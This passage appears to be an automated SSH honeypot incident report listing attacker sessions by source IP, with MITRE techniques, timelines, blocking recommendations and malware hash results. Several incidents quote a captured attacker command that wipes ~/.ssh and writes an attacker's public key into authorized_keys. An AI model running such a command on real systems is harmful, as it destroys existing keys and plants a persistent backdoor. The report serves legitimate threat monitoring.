| `2026-05-21 15:02:38` | `cowrie.command.input` |
| `2026-05-21 15:02:38` | `cowrie.log.closed` |
| `2026-05-21 15:02:38` | `cowrie.session.params` |
| `2026-05-21 15:02:38` | `cowrie.command.input` |
| `2026-05-21 15:02:38` | `cowrie.log.closed` |
| `2026-05-21 15:02:39` | `cowrie.session.params` |
| `2026-05-21 15:02:39` | `cowrie.command.input` |
| `2026-05-21 15:02:39` | `cowrie.log.closed` |
| `2026-05-21 15:02:39` | `cowrie.session.params` |
| `2026-05-21 15:02:39` | `cowrie.command.input` |
| `2026-05-21 15:02:40` | `cowrie.log.closed` |
| `2026-05-21 15:02:40` | `cowrie.session.params` |
| `2026-05-21 15:02:40` | `cowrie.command.input` |
| `2026-05-21 15:02:40` | `cowrie.log.closed` |
| `2026-05-21 15:02:41` | `cowrie.session.params` |
| `2026-05-21 15:02:41` | `cowrie.command.input` |
| `2026-05-21 15:02:41` | `cowrie.log.closed` |
| `2026-05-21 15:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.92.58[.]210` to AbuseIPDB if not already reported
- [ ] Block `61.92.58[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11cded324275

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-21 15:39 |
| **Last Seen** | 2026-05-21 15:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:39:27` | `cowrie.session.connect` |
| `2026-05-21 15:39:27` | `cowrie.client.version` |
| `2026-05-21 15:39:27` | `cowrie.client.kex` |
| `2026-05-21 15:39:27` | `cowrie.login.success` |
| `2026-05-21 15:39:27` | `cowrie.session.params` |
| `2026-05-21 15:39:27` | `cowrie.command.input` |
| `2026-05-21 15:39:27` | `cowrie.command.failed` |
| `2026-05-21 15:39:27` | `cowrie.log.closed` |
| `2026-05-21 15:39:27` | `cowrie.session.params` |
| `2026-05-21 15:39:27` | `cowrie.command.input` |
| `2026-05-21 15:39:27` | `cowrie.session.file_download` |
| `2026-05-21 15:39:27` | `cowrie.log.closed` |
| `2026-05-21 15:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7da810291385

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-21 15:39 |
| **Last Seen** | 2026-05-21 15:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:39:28` | `cowrie.session.connect` |
| `2026-05-21 15:39:28` | `cowrie.client.version` |
| `2026-05-21 15:39:28` | `cowrie.client.kex` |
| `2026-05-21 15:39:28` | `cowrie.login.success` |
| `2026-05-21 15:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdaf8eec53a0

| Field | Detail |
|---|---|
| **Source IP** | `14.102.230[.]4` |
| **First Seen** | 2026-05-21 15:41 |
| **Last Seen** | 2026-05-21 15:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:41:20` | `cowrie.session.connect` |
| `2026-05-21 15:41:20` | `cowrie.client.version` |
| `2026-05-21 15:41:20` | `cowrie.client.kex` |
| `2026-05-21 15:41:22` | `cowrie.login.success` |
| `2026-05-21 15:41:22` | `cowrie.session.params` |
| `2026-05-21 15:41:22` | `cowrie.command.input` |
| `2026-05-21 15:41:22` | `cowrie.command.failed` |
| `2026-05-21 15:41:23` | `cowrie.log.closed` |
| `2026-05-21 15:41:23` | `cowrie.session.params` |
| `2026-05-21 15:41:23` | `cowrie.command.input` |
| `2026-05-21 15:41:24` | `cowrie.session.file_download` |
| `2026-05-21 15:41:24` | `cowrie.log.closed` |
| `2026-05-21 15:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.102.230[.]4` to AbuseIPDB if not already reported
- [ ] Block `14.102.230[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3166c3790179

| Field | Detail |
|---|---|
| **Source IP** | `14.102.230[.]4` |
| **First Seen** | 2026-05-21 15:41 |
| **Last Seen** | 2026-05-21 15:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:41:27` | `cowrie.session.connect` |
| `2026-05-21 15:41:27` | `cowrie.client.version` |
| `2026-05-21 15:41:28` | `cowrie.client.kex` |
| `2026-05-21 15:41:29` | `cowrie.login.success` |
| `2026-05-21 15:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.102.230[.]4` to AbuseIPDB if not already reported
- [ ] Block `14.102.230[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70e457142833

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-21 15:45 |
| **Last Seen** | 2026-05-21 15:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:45:15` | `cowrie.session.connect` |
| `2026-05-21 15:45:15` | `cowrie.client.version` |
| `2026-05-21 15:45:15` | `cowrie.client.kex` |
| `2026-05-21 15:45:15` | `cowrie.login.success` |
| `2026-05-21 15:45:15` | `cowrie.session.params` |
| `2026-05-21 15:45:15` | `cowrie.command.input` |
| `2026-05-21 15:45:15` | `cowrie.command.failed` |
| `2026-05-21 15:45:15` | `cowrie.log.closed` |
| `2026-05-21 15:45:15` | `cowrie.session.params` |
| `2026-05-21 15:45:15` | `cowrie.command.input` |
| `2026-05-21 15:45:15` | `cowrie.session.file_download` |
| `2026-05-21 15:45:15` | `cowrie.log.closed` |
| `2026-05-21 15:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d224ece7ee0d

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-21 15:45 |
| **Last Seen** | 2026-05-21 15:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:45:16` | `cowrie.session.connect` |
| `2026-05-21 15:45:16` | `cowrie.client.version` |
| `2026-05-21 15:45:16` | `cowrie.client.kex` |
| `2026-05-21 15:45:16` | `cowrie.login.success` |
| `2026-05-21 15:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74ab67ed46bf

| Field | Detail |
|---|---|
| **Source IP** | `151.95.83[.]235` |
| **First Seen** | 2026-05-21 15:46 |
| **Last Seen** | 2026-05-21 15:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:46:00` | `cowrie.session.connect` |
| `2026-05-21 15:46:00` | `cowrie.client.version` |
| `2026-05-21 15:46:01` | `cowrie.client.kex` |
| `2026-05-21 15:46:01` | `cowrie.login.success` |
| `2026-05-21 15:46:01` | `cowrie.session.params` |
| `2026-05-21 15:46:01` | `cowrie.command.input` |
| `2026-05-21 15:46:01` | `cowrie.command.failed` |
| `2026-05-21 15:46:02` | `cowrie.log.closed` |
| `2026-05-21 15:46:02` | `cowrie.session.params` |
| `2026-05-21 15:46:02` | `cowrie.command.input` |
| `2026-05-21 15:46:02` | `cowrie.session.file_download` |
| `2026-05-21 15:46:02` | `cowrie.log.closed` |
| `2026-05-21 15:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.95.83[.]235` to AbuseIPDB if not already reported
- [ ] Block `151.95.83[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f3ff5267e7f

| Field | Detail |
|---|---|
| **Source IP** | `151.95.83[.]235` |
| **First Seen** | 2026-05-21 15:46 |
| **Last Seen** | 2026-05-21 15:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:46:04` | `cowrie.session.connect` |
| `2026-05-21 15:46:04` | `cowrie.client.version` |
| `2026-05-21 15:46:04` | `cowrie.client.kex` |
| `2026-05-21 15:46:05` | `cowrie.login.success` |
| `2026-05-21 15:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `151.95.83[.]235` to AbuseIPDB if not already reported
- [ ] Block `151.95.83[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbe8898bce5d

| Field | Detail |
|---|---|
| **Source IP** | `102.216.240[.]61` |
| **First Seen** | 2026-05-21 15:46 |
| **Last Seen** | 2026-05-21 15:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:46:48` | `cowrie.session.connect` |
| `2026-05-21 15:46:48` | `cowrie.client.version` |
| `2026-05-21 15:46:48` | `cowrie.client.kex` |
| `2026-05-21 15:46:49` | `cowrie.login.success` |
| `2026-05-21 15:46:50` | `cowrie.session.params` |
| `2026-05-21 15:46:50` | `cowrie.command.input` |
| `2026-05-21 15:46:50` | `cowrie.command.failed` |
| `2026-05-21 15:46:50` | `cowrie.log.closed` |
| `2026-05-21 15:46:51` | `cowrie.session.params` |
| `2026-05-21 15:46:51` | `cowrie.command.input` |
| `2026-05-21 15:46:51` | `cowrie.session.file_download` |
| `2026-05-21 15:46:51` | `cowrie.log.closed` |
| `2026-05-21 15:46:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.216.240[.]61` to AbuseIPDB if not already reported
- [ ] Block `102.216.240[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ad227d70ef

| Field | Detail |
|---|---|
| **Source IP** | `102.216.240[.]61` |
| **First Seen** | 2026-05-21 15:46 |
| **Last Seen** | 2026-05-21 15:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:46:54` | `cowrie.session.connect` |
| `2026-05-21 15:46:54` | `cowrie.client.version` |
| `2026-05-21 15:46:54` | `cowrie.client.kex` |
| `2026-05-21 15:46:55` | `cowrie.login.success` |
| `2026-05-21 15:46:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.216.240[.]61` to AbuseIPDB if not already reported
- [ ] Block `102.216.240[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a97e8e4511c5

| Field | Detail |
|---|---|
| **Source IP** | `102.216.240[.]61` |
| **First Seen** | 2026-05-21 15:56 |
| **Last Seen** | 2026-05-21 15:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:56:45` | `cowrie.session.connect` |
| `2026-05-21 15:56:45` | `cowrie.client.version` |
| `2026-05-21 15:56:45` | `cowrie.client.kex` |
| `2026-05-21 15:56:46` | `cowrie.login.success` |
| `2026-05-21 15:56:46` | `cowrie.session.params` |
| `2026-05-21 15:56:46` | `cowrie.command.input` |
| `2026-05-21 15:56:46` | `cowrie.command.failed` |
| `2026-05-21 15:56:47` | `cowrie.log.closed` |
| `2026-05-21 15:56:47` | `cowrie.session.params` |
| `2026-05-21 15:56:47` | `cowrie.command.input` |
| `2026-05-21 15:56:47` | `cowrie.session.file_download` |
| `2026-05-21 15:56:47` | `cowrie.log.closed` |
| `2026-05-21 15:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.216.240[.]61` to AbuseIPDB if not already reported
- [ ] Block `102.216.240[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1caf7a87c2af

| Field | Detail |
|---|---|
| **Source IP** | `102.216.240[.]61` |
| **First Seen** | 2026-05-21 15:56 |
| **Last Seen** | 2026-05-21 15:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 15:56:50` | `cowrie.session.connect` |
| `2026-05-21 15:56:50` | `cowrie.client.version` |
| `2026-05-21 15:56:51` | `cowrie.client.kex` |
| `2026-05-21 15:56:52` | `cowrie.login.success` |
| `2026-05-21 15:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.216.240[.]61` to AbuseIPDB if not already reported
- [ ] Block `102.216.240[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9a1380b3119

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]177` |
| **First Seen** | 2026-05-21 16:16 |
| **Last Seen** | 2026-05-21 16:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 16:16:02` | `cowrie.session.connect` |
| `2026-05-21 16:16:03` | `cowrie.login.success` |
| `2026-05-21 16:16:03` | `cowrie.session.params` |
| `2026-05-21 16:16:04` | `cowrie.command.input` |
| `2026-05-21 16:16:04` | `cowrie.command.input` |
| `2026-05-21 16:16:05` | `cowrie.command.input` |
| `2026-05-21 16:16:06` | `cowrie.command.input` |
| `2026-05-21 16:16:06` | `cowrie.command.failed` |
| `2026-05-21 16:16:07` | `cowrie.log.closed` |
| `2026-05-21 16:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]177` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `102.216.240[.]61` | **21** | 2026-05-21 15:30 | 2026-05-21 16:05 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `196.196.150[.]5` | **15** | 2026-05-21 13:27 | 2026-05-21 13:45 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `182.18.161[.]165` | **9** | 2026-05-21 15:37 | 2026-05-21 15:48 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `118.193.73[.]8` | **8** | 2026-05-21 14:42 | 2026-05-21 14:44 | 2m | 4 | `T1110.001` | 🟢 LOW |
| `151.95.83[.]235` | **8** | 2026-05-21 15:37 | 2026-05-21 15:46 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `82.197.58[.]130` | **8** | 2026-05-21 15:32 | 2026-05-21 15:46 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `14.102.230[.]4` | **6** | 2026-05-21 15:37 | 2026-05-21 15:45 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `157.245.56[.]194` | **3** | 2026-05-21 13:17 | 2026-05-21 13:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `157.245.56[.]194` | **3** | 2026-05-21 16:25 | 2026-05-21 16:26 | 1m | 0 | `T1592` | 🟢 LOW |
| `194.102.73[.]93` | **3** | 2026-05-21 13:43 | 2026-05-21 15:06 | 2m | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]73` | **3** | 2026-05-21 13:58 | 2026-05-21 13:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `196.250.193[.]13` | **2** | 2026-05-21 15:30 | 2026-05-21 15:32 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]178` | **2** | 2026-05-21 15:24 | 2026-05-21 15:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.1.188[.]238` | 1 | 2026-05-21 13:21 | 2026-05-21 13:21 | 13s | 0 | `T1592` | 🟢 LOW |
| `122.224.240[.]99` | 1 | 2026-05-21 15:34 | 2026-05-21 15:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.76.228[.]194` | 1 | 2026-05-21 15:34 | 2026-05-21 15:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `131.0.226[.]61` | 1 | 2026-05-21 13:41 | 2026-05-21 13:42 | 31s | 0 | `T1592` | 🟢 LOW |
| `176.65.139[.]177` | 1 | 2026-05-21 16:16 | 2026-05-21 16:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.117.103[.]121` | 1 | 2026-05-21 13:23 | 2026-05-21 13:23 | 13s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]224` | 1 | 2026-05-21 13:58 | 2026-05-21 13:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]225` | 1 | 2026-05-21 13:58 | 2026-05-21 13:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]226` | 1 | 2026-05-21 13:58 | 2026-05-21 13:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.133.227[.]46` | 1 | 2026-05-21 14:34 | 2026-05-21 14:34 | 13s | 0 | `T1592` | 🟢 LOW |
| `223.123.124[.]104` | 1 | 2026-05-21 15:27 | 2026-05-21 15:28 | 12s | 0 | `T1592` | 🟢 LOW |
| `3.91.176[.]195` | 1 | 2026-05-21 12:55 | 2026-05-21 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.111.53[.]56` | 1 | 2026-05-21 16:23 | 2026-05-21 16:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.166.58[.]57` | 1 | 2026-05-21 13:02 | 2026-05-21 13:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `85.217.140[.]35` | 1 | 2026-05-21 13:21 | 2026-05-21 13:21 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
